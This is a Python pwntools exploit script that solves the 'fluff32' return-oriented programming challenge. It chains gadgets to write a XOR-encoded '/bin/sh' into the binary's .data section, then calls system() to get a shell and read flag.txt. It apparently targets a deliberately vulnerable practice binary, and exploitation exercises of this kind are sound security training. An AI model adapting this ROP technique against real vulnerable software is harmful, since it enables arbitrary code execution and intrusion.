#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def sxor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def set_ebx_to_data(rop, data):
    pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
    pop_esi_ebp = 0x0804867a                                # pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe

    rop.raw(p32(pop_ebx) + p32(data ^ 0x0))
    rop.raw(p32(pop_esi_ebp) + "B"*8)


def set_ebx_to_string(rop, str_i):
    pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
    pop_esi_ebp = 0x0804867a                                # pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe
    key_xor = "B"
    string = list("/bin/sh\x00")

    string[0] = sxor(string[0], key_xor)
    string[4] = sxor(string[4], key_xor)
    string = string[::-1]
    string = ''.join(string).encode("hex")
    if str_i == 0:
        rop.raw(p32(pop_ebx) + p32(int(string[8:], 16) ^ 0x0))
        rop.raw(p32(pop_esi_ebp) + "B"*8)
    else:
        rop.raw(p32(pop_ebx) + p32(int(string[:8], 16) ^ 0x0))
        rop.raw(p32(pop_esi_ebp) + "B"*8)


def main():
    context(arch="i386", os="linux", endian="little")
    e = ELF("./fluff32")
    rop = ROP([e])

    xchg_pop_ebp = 0x08048684                               # mov edi, 0xdeadbeef ; xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0
    pop_edi_pop_ebp_pop_ebx = 0x08048692                    # pop edi ; mov [ecx], edx ; pop ebp ; pop edx ; xor [ecx], bl
    xor_edx = 0x08048670                                    # xor edx, edx
    system = e.plt['system']
    data = get_section_addr(e, '.data')

    rop.raw(rop.generatePadding(0,44))

    rop.raw(p32(xor_edx) + "B"*8)
    set_ebx_to_data(rop, data)
    rop.raw(p32(xchg_pop_ebp) + "B"*4)

    rop.raw(p32(xor_edx) + "B"*8)
    set_ebx_to_string(rop, 0)
    rop.raw(p32(pop_edi_pop_ebp_pop_ebx) + "B"*12)

    rop.raw(p32(xor_edx) + "B"*8)
    set_ebx_to_data(rop, data+4)
    rop.raw(p32(xchg_pop_ebp) + "B"*4)

    rop.raw(p32(xor_edx) + "B"*8)
    set_ebx_to_string(rop, 1)
    rop.raw(p32(pop_edi_pop_ebp_pop_ebx) + "B"*12)

    rop.raw(p32(system) + p32(system) + p32(data))

    p = process(['./fluff32'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(str(rop))
    p.sendline("/bin/cat flag.txt")
    msg = p.recvline(timeout=1)
    print msg

    p.close()


if __name__ == "__main__":
    main()
